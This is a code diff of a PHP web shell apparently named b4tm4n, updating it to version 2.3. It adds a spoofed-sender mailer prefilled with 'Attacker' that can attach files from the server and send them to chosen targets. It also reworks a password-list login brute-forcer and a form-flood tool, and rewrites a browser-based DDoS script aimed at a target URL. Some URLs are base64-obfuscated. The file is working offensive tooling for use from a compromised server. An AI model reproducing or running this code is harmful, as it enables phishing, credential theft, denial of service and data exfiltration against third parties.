+							<label>From</label><input type='text' id='email-from' placeholder='Attacker <very@handsome.com>' value='Attacker <very@handsome.com>'/><br>
+							<label>Reply To</label><input type='text' id='email-reply' placeholder=very@handsome.com' value='very@handsome.com'/><br>
+							<label>To</label><input type='text' id='email-to' placeholder='Target 1 <target1@target.com>,Target 2 <target2@target.com>' value=''/><br>
+							<label>Cc</label><input type='text' id='email-cc' placeholder='target1@target.com,target2@target.com' value=''/><br>
+							<label>Bcc</label><input type='text' id='email-bcc' placeholder='target1@target.com,target2@target.com' value=''/><br>
+							<label>Subject</label><input type='text' id='email-subject' placeholder='What You Waiting For ?' value=''/><br>
+							<label>Attachment (Path)</label><input type='text' id='email-attachment' placeholder='%s' value=''/><br>
+							<label>Messages</label><input type='text' id='email-message'/><br>
+							<input type='submit' value='Send' onclick=\"
 
-		$message='
-		<html>
-		<head>
-		  <title>Birthday Reminders for August</title>
-		</head>
-		<body>
-		  <p>Here are the birthdays upcoming in August!</p>
-		  <table>
-		    <tr>
-		      <th>Person</th><th>Day</th><th>Month</th><th>Year</th>
-		    </tr>
-		    <tr>
-		      <td>Johny</td><td>10th</td><td>August</td><td>1970</td>
-		    </tr>
-		    <tr>
-		      <td>Sally</td><td>17th</td><td>August</td><td>1973</td>
-		    </tr>
-		  </table>
-		</body>
-		</html>
-		';
+								getAjax(true,
+									'send-result',
+									'POST',
+									'?x=mail&xa=send'+
+									'&from='+document.getElementById('email-from').value+
+									'&reply='+document.getElementById('email-reply').value+
+									'&to='+document.getElementById('email-to').value+
+									'&cc='+document.getElementById('email-cc').value+
+									'&bcc='+document.getElementById('email-bcc').value+
+									'&subject='+document.getElementById('email-subject').value+
+									'&message='+document.getElementById('email-message').value+
+									'&attachment='+document.getElementById('email-attachment').value);
 
-		$headers[]='MIME-Version:1.0';
-		$headers[]='Content-type:text/html;charset=iso-8859-1';
-		$headers[]='To:Mary <mary@example.com>,Kelly <kelly@example.com>';
-		$headers[]='From:Birthday Reminder <birthday@example.com>';
-		$headers[]='Cc:birthdayarchive@example.com';
-		$headers[]='Bcc:birthdaycheck@example.com';
+							\"/>
+							<span id='send-result'></span>	
+						</form>
+					</fieldset>
+				</div>
+				<div class='divide-right'>
+					<fieldset>
+						<legend>Spam</legend>
+						Coming Soon
+					</fieldset>
+				</div>
+			</div>
 
-		$send_mail=mail($to,$subject,$message,implode("\r\n",$headers));
+		",$dir._);
 
-		var_dump($send_mail);
+		if(any('xa',$_REQUEST)&&$_REQUEST['xa']=='send')
+		{
+			ob_clean();
+			$from=$_REQUEST['from'];
+			$reply=$_REQUEST['reply'];
+			$to=$_REQUEST['to'];
+			$cc=$_REQUEST['cc'];
+			$bcc=$_REQUEST['bcc'];
+			$subject=$_REQUEST['subject'];
+			$msg=$_REQUEST['message'];
+			$attachment=$_REQUEST['attachment'];
+			$uid=md5(uniqid(time()));
+
+			$headers[]="From: $from";
+			$headers[]="Reply-To: $reply";
+			$headers[]="To: $to";
+			if(!empty($cc)) $headers[]='Cc: $cc';
+			if(!empty($bcc)) $headers[]='Bcc: $bcc';
+			$headers[]="MIME-Version: 1.0";
+			$headers[]="Content-Type: multipart/mixed; boundary=\"$uid\"";
+
+			$messages[]="--$uid";
+		    $messages[]="Content-type: text/html; charset=\"iso-8859-1\"";
+		    $messages[]="Content-Transfer-Encoding: 8bit";
+		    $messages[]="";
+		    $messages[]="$msg";
+		    $messages[]="";
+
+			if(is_file($attachment))
+			{
+				$content=file_get_contents($attachment);
+				$content=chunk_split(base64_encode($content));
+				$name=basename($attachment);
+				$mime=mime_content_type($attachment);
+
+				$messages[]="--$uid";
+			    $messages[]="Content-Type: $mime; name=\"$name\"";
+			    $messages[]="Content-Transfer-Encoding: base64";
+			    $messages[]="Content-Disposition: attachment";
+			    $messages[]="";
+			    $messages[]="$content";
+			    $messages[]="";
+			    $messages[]="--$uid--";
+			}
+
+			$message=implode("\r\n",$messages);
+			$header=implode("\r\n",$headers);
+
+			if(mail($to,$subject,$message,$header))
+			{
+				print "Email Send";
+			} 
+			else 
+			{
+				print "Error :" . error_get_last()['message'];
+			}
+			exit;
+		}
 	}
 	if($_REQUEST['x']=='process')
 	{
@@ -2404,6 +2543,16 @@ if(any("x",$_REQUEST))
 
 			$row.="<tr><td>".urld($file)."</td></tr>";
 			$tmp.=urld($file).",";
+		}
+
+		if(count($files)==1&&$value=='copy')
+		{
+			header('location:'.php_self.'?a=cp&r='.$files[0]);
+		}
+
+		if(count($files)==1&&$value=='move')
+		{
+			header('location:'.php_self.'?a=mv&r='.$files[0]);
 		}
 
 		if(!any('xa',$_REQUEST)&&$value=='delete')
@@ -2668,7 +2817,7 @@ if(any("x",$_REQUEST))
 	if($_REQUEST['x']=="update")
 	{
 		$link_update='https://raw.githubusercontent.com/k4mpr3t/b4tm4n/master/bat.php';
-		$current_version=2.2; //Sensitive Case Variable
+		$current_version=2.3; //Sensitive Case Variable
 
 		if($config['debug']==true)
 		{
@@ -2763,7 +2912,7 @@ if(any("z",$_REQUEST))
 			$geoip=GetUrlContent($url);
 			$json=json_decode($geoip,true);
 			$url=sprintf(B64D("zSI9xSN3Ob0gBCYaOnwey7whAH4kwX0gBCYa")."?q=%s,%s&z=10&output=embed",$json['latitude'],$json['longitude']);
-			printf("<h3 align='center'><font class='on'>%s (%s) | %s,%s</font></h3><br>
+			printf("<h3 align='center'><font class='on'>%s (%s) | %s, %s</font></h3><br>
 					<iframe src='%s' width='100%%' height='345' frameBorder='0'><iframe>",
 					$json['country_name'],
 					$json['country_code'],
@@ -2983,18 +3132,18 @@ if(any("z",$_REQUEST))
 
 		function chr_asc($str){
 			$asc='';
-			for ($i=0;$i<strlen($str);$i++) 
+			for($i=0;$i<strlen($str);$i++) 
 				$asc.=ord($str{$i}).' ';
 			return rtrim($asc);
 		} 
 
 		function asc_chr($asc){
 			$str='';
-			if (strpos($asc,' ')) {
+			if (strpos($asc,' ')){
 				$exps=explode(' ',$asc);
 				foreach($exps as $exp)
 					$str.=chr($exp);
-			} else {
+			}else{
 				$str=chr($asc);
 			}
 			return $str;
@@ -3108,33 +3257,34 @@ if(any("z",$_REQUEST))
 			  <h3> by: ".$menu_tools[$z]['auth']."</h3>
 		  </div>";
 
-		$exp='{
-   "name":"Handsome",
-   "email":"very@handsome.com",
-   "subject":"WHOOPS YOU GOT E-MAIL ?!",
-   "message":"HA HA HA HA HA HA HA HA"
-}';
+		 $exp=[
+		 	'{',
+		 	'"name":"Handsome",',
+		 	'"email":"very@handsome.com",',
+		 	'"subject":"WHOOPS YOU GOT E-MAIL ?!",',
+		 	'"message":"HA HA HA HA HA HA HA HA",',
+		 	'}'];
 
 		printf("<div class='form-bruteforces'>
-			<div class='divide-left'>
-				<form onsubmit='return false;' class='new'>
-					<label>Url Action</label><input type='text' id='form-url' placeholder='http://'/><br>
-					<label>Count's</label><input type='number' id='form-count' value='100' min='10' autocomplete='off'/><br>
+				<div class='divide-left'>
+					<form onsubmit='return false;' class='new'>
+						<label>Url Action</label><input type='text' id='form-url' placeholder='http://'/><br>
+						<label>Count's</label><input type='number' id='form-count' value='100' min='10' autocomplete='off'/><br>
+						<fieldset>
+							<legend>Parameter (JSON)</legend>
+							<textarea id='form-parameter'>%s</textarea>
+						</fieldset>
+						<input type='submit' onclick=\"return ajaxAbort(true,'form-result')\" value=Cancel />
+						<input type='submit' value='Attack' onclick=\"return getAjax(true,'form-result','POST','?z=form-bruteforces&url='+document.getElementById('form-url').value+'&parameter='+document.getElementById('form-parameter').value+'&count='+document.getElementById('form-count').value);\"/><br>
+					</form>
+				</div>
+				<div class='divide-right'>
 					<fieldset>
-						<legend>Parameter (JSON)</legend>
-						<textarea id='form-parameter'>%s</textarea>
+						<legend>Result's</legend>
+						<div id='form-result' class='result'></div>
 					</fieldset>
-					<input type='submit' onclick=\"return ajaxAbort(true,'form-result')\" value=Cancel />
-					<input type='submit' value='Attack' onclick=\"return getAjax(true,'form-result','POST','?z=form-bruteforces&url='+document.getElementById('form-url').value+'&parameter='+document.getElementById('form-parameter').value+'&count='+document.getElementById('form-count').value);\"/><br>
-				</form>
-			</div>
-			<div class='divide-right'>
-				<fieldset>
-					<legend>Result's</legend>
-					<div id='form-result' class='result'></div>
-				</fieldset>
-			</div>
-		</div>",$exp);
+				</div>
+			</div>",implode($exp,"\n"));
 
 		if(any("url",$_REQUEST)&&any("parameter",$_REQUEST))
 		{
@@ -3150,13 +3300,14 @@ if(any("z",$_REQUEST))
 				$ch=curl_init();
 				curl_setopt($ch,CURLOPT_USERAGENT,$userAgent);
 				curl_setopt($ch,CURLOPT_URL,$url);
-				curl_setopt($ch,CURLOPT_POST,true);
+				curl_setopt($ch,CURLOPT_POST,1);
 				curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,10);
 				curl_setopt($ch,CURLOPT_POSTFIELDS,http_build_query($content));
-				curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
-				curl_setopt($ch,CURLOPT_FOLLOWLOCATION,true);
+				curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
+				curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
 				$result=curl_exec($ch);
-				$httpcode=curl_getinfo($ch,CURLINFO_HTTP_CODE); 
+				$httpcode=curl_getinfo($ch,CURLINFO_HTTP_CODE);
+				if(curl_error($ch)) echo curl_error($ch);
 				curl_close($ch);
 				if($httpcode==200)
 				{
@@ -3185,9 +3336,17 @@ if(any("z",$_REQUEST))
 			<div class='divide-left'>
 				<form onsubmit='return false;' class='new'>
 					<label>Url Action</label><input type='text' id='login-url' placeholder='http://'/><br>
-					<label>Username</label><input type='text' id='login-username' value='admin'/><br>
+					<label>User List</label><input type='text' id='login-user' placeholder='admin' value='admin'/><br>
+					<label>&nbsp;</label><input type='text' id='login-username' placeholder='User Fieldname'/><br>
 					<label>Pass List</label><input type='text' id='login-passlist' placeholder='http://'/><br>
-					<input type='submit' onclick=\"return getAjax(true,'login-result','POST','?z=login-bruteforces&url='+document.getElementById('login-url').value+'&user='+document.getElementById('login-username').value+'&passlist='+document.getElementById('login-passlist').value);\"/><br>
+					<label>&nbsp;</label><input type='text' id='login-passname' placeholder='Pass Fieldname'/><br>
+					<input type='submit' onclick=\"return getAjax(true,'login-result','POST',
+					'?z=login-bruteforces'+
+					'&url='+document.getElementById('login-url').value+
+					'&user='+document.getElementById('login-user').value+
+					'&userfield='+document.getElementById('login-username').value+
+					'&passfield='+document.getElementById('login-passname').value+
+					'&passlist='+document.getElementById('login-passlist').value);\"/><br>
 				</form>
 			</div>
 			<div class='divide-right'>
@@ -3202,40 +3361,48 @@ if(any("z",$_REQUEST))
 		{
 			ob_clean();
 			ini_set('max_execution_time','600');
+
 			$url=$_REQUEST['url'];
 			$user=$_REQUEST['user'];
-			$file=GetUrlExists($_REQUEST['passlist']) ? 
-					GetUrlContent($_REQUEST['passlist']) : 
-					$_REQUEST['passlist'];
-			
+			$file=GetUrlExists($_REQUEST['passlist'])? 
+			GetUrlContent($_REQUEST['passlist']): 
+			$_REQUEST['passlist'];
 			$words=explode("\n",$file);
 			$length=count($words);
-
+			
 			foreach ($words as $index => $word) 
 			{
-				$curl=curl_init($url);
-				$word=strtolower($word);
-				curl_setopt($curl,CURLOPT_USERAGENT,$userAgent);
-				curl_setopt($curl,CURLOPT_HTTPAUTH,CURLAUTH_BASIC);
-				curl_setopt($curl,CURLOPT_USERPWD,"$user:$word");
-				curl_setopt($curl,CURLOPT_RETURNTRANSFER,true);
-				curl_setopt($curl,CURLOPT_SSL_VERIFYHOST,0);
-				curl_setopt($curl,CURLOPT_SSL_VERIFYPEER,0);
-				$result=curl_exec($curl);
-				$status=curl_getinfo($curl,CURLINFO_HTTP_CODE);
-				curl_close($curl);
-				
-				if(curl_error($curl)) 
-				{
-				    echo curl_error($curl);
-				}
+				$parameter=http_build_query(
+					array(
+						$_REQUEST['userfield'] => $user,
+						$_REQUEST['passfield'] => $word,
+						'Submit' => 'Submit',
 
-				if ($status==200) 
+					)
+				);
+
+				$ch=curl_init();
+				curl_setopt($ch,CURLOPT_USERAGENT,$userAgent);
+				curl_setopt($ch,CURLOPT_URL,$url);
+				curl_setopt($ch,CURLOPT_POST,1);
+				curl_setopt($ch,CURLOPT_TIMEOUT,5);
+				curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,5);
+				curl_setopt($ch,CURLOPT_POSTFIELDS,$parameter);
+				curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
+				$ra=curl_exec($ch);
+				$st=curl_getinfo($ch,CURLINFO_HTTP_CODE);
+				if(curl_error($ch)) echo curl_error($ch);
+				curl_close($ch);
+				if ($st==200) 
 				{
 					echo "FOUND'S: $user:$word<br>";
-					exit();
+					ini_set('max_execution_time','60');
+					exit;
 				}
-
+				else
+				{
+					echo htmlspecialchars($ra);
+				}
 			}
 			ini_set('max_execution_time','60');
 			exit;
@@ -3247,105 +3414,100 @@ if(any("z",$_REQUEST))
 			  <h3>".$menu_tools[$z]['title']." v".$menu_tools[$z]['ver']."</h3>
 			  <h3> by: ".$menu_tools[$z]['auth']."</h3>
 		  </div>";
+
 		print "Coming Soon";
 	}
 	if($z=="ddos-attack")
 	{
 		print "<div class='tools-header'>
-			  <h3>".$menu_tools[$z]['title']." v".$menu_tools[$z]['ver']."</h3>
-			  <h3> by: ".$menu_tools[$z]['auth']."</h3>
+			<h3>".$menu_tools[$z]['title']." v".$menu_tools[$z]['ver']."</h3>
+			<h3> by: ".$menu_tools[$z]['auth']."</h3>
 		  </div>";
 
-		$js=<<< JS
-<script type="text/javascript">
-window.onload=function(){
+		printf('<script type="text/javascript">
+					window.onload=function(){
 
-	var AttackInterval;
-	var xhttp;
+						var AttackInterval;
+						var xhttp;
 
-	var requestedNode=document.getElementById("requested"),
-        succeededNode=document.getElementById("succeeded"),
-        failedNode=document.getElementById("failed"),
-        targetNode=document.getElementById("target"),
-        attack=document.getElementById("attack"),
-        requestsNode=document.getElementById("requests"),
-        messagesNode=document.getElementById("messages")
+						var requestedNode=document.getElementById("requested"),
+					        succeededNode=document.getElementById("succeeded"),
+					        proccessNode=document.getElementById("proccess"),
+					        targetNode=document.getElementById("target"),
+					        attack=document.getElementById("attack"),
+					        requestsNode=document.getElementById("requests"),
+					        messagesNode=document.getElementById("messages")
 
-	var requested=0,
-        succeeded=0,
-        failed=0;
+						var requested=0,
+					        succeeded=0,
+					        proccess=0;
 
-	var makeHttpRequest=function(){
-		var buff=new ArrayBuffer(512);
-		var bits=new Uint8Array(buff);
-		var xhrx=new XMLHttpRequest();
-		xhrx.open("POST",target=targetNode.value,true);
-		xhrx.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
-		xhttp=xhrx;
-		xhrx.onreadystatechange=function(){
-		    if(xhrx.readyState==XMLHttpRequest.DONE){
-		    	if(xhrx.status>=200 && xhrx.status<300){
-			    	onSuccess();
-			    }else{
-			   		onFail();
-			    }
-		   	}
-		   	onRequest();
-		}
-		for(var i=0;i< bits.length;i++){
-			bits[i]=i % 255;
-		}
-		buff['stamp']=messagesNode.value;
-		xhrx.send(buff);
-        };
+						var makeHttpRequest=function(){
+							var buff=new ArrayBuffer(1024);
+							var bits=new Int8Array(buff);
+							var xhrx=new XMLHttpRequest();
+							xhrx.open("POST",targetNode.value,true);
+							xhrx.setRequestHeader(\'Content-Type\',\'application/x-www-form-urlencoded\');
+							xhttp=xhrx;
+							xhrx.onreadystatechange=function(){
+							    if(xhrx.readyState==XMLHttpRequest.DONE){
+							    	if(xhrx.status!=0){
+								    	onSuccess();
+								    }else{
+								    	onProcess();
+								    }
+							   	}
+							   	onRequest();
+							}
+							for(var i=0;i<bits.length;i++){
+								bits[i]=i%%255;
+							}
+							bits[\'stamp\']=messagesNode.value;
+							xhrx.send(buff);
+					        };
 
-	var onRequest=function(){
-            requested++;
-            requestedNode.innerHTML=requested;
-	    };
+						var onRequest=function(){
+					            requested++;
+					            requestedNode.innerHTML=requested;
+						    };
 
 
-	var onFail=function(){
-	    	failed++;
-            failedNode.innerHTML=failed;
-	    };
+						var onProcess=function(){
+						    	proccess++;
+					            proccessNode.innerHTML=proccess;
+						    };
 
-	var onSuccess=function(){
-            succeeded++;
-            succeededNode.innerHTML=succeeded;
-    	};
+						var onSuccess=function(){
+					            succeeded++;
+					            succeededNode.innerHTML=succeeded;
+					    	};
 
-	attack.onclick=function(){
-		if(this.value=='Start'){
-			requested=0;
-	        succeeded=0;
-	        failed=0;
-			this.value="Stop";
-			AttackInterval=setInterval(makeHttpRequest,(parseInt(requestsNode.value)));
-		}else if(this.value=='Stop'){
-			this.value="Start";
-			xhttp.abort();
-			clearInterval(AttackInterval);
-		}
-	};
-}
-</script>
-
-<form onsubmit="return false;" class="new">
-	<label>Target</label><input type="text" id="target" value="http://www.target.com"><br>
-	<label>Messages</label><input type="text" id="messages" value="Syn Attack"><br>
-	<label>Interval</label><input type="number" id="requests" value="500" min='500'><br>
-	<label style="margin:10px 0">Requests <span id="requested">0</span> |
-	Succeded <span id="succeeded">0</span> |
-	Failed   <span id="failed">0</span></label><br>
-	<input type="submit" id="attack" value="Start"/>
-</form>
-
-JS;
-
-		printf('%s',$js);		 
-		
-		
+						attack.onclick=function(){
+							if(this.value==\'Start\'){
+								requested=0;
+						        succeeded=0;
+						        proccess=0;
+								this.value="Stop";
+								AttackInterval=setInterval(makeHttpRequest,(parseInt(requestsNode.value)));
+							}else if(this.value==\'Stop\'){
+								this.value="Start";
+								xhttp.abort();
+								clearInterval(AttackInterval);
+							}
+						};
+					}
+				</script>
+				<form onsubmit="return false;" class="new">
+					<label>Target</label><input type="text" id="target" value="http://www.target.com"><br>
+					<label>Messages</label><input type="text" id="messages" value="Syn Attack"><br>
+					<label>Intv (ms)</label><input type="number" id="requests" value="500"><br>
+					<label style="margin:10px 0">
+						Requests <span id="requested">0</span> |
+						Proccess <span id="proccess">0</span>  |
+						Succeded <span id="succeeded">0</span>
+					</label><br>
+					<input type="submit" id="attack" value="Start"/>
+				</form>');
 	}
 
 	print "</div>";
